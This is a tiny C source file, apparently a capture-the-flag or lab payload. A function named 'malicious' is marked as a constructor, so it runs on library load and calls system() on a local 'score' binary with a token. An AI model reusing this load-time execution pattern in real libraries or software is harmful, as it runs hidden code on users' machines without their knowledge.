#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score 018b75b2-4d52-48dc-b17d-2222f786647d");
}
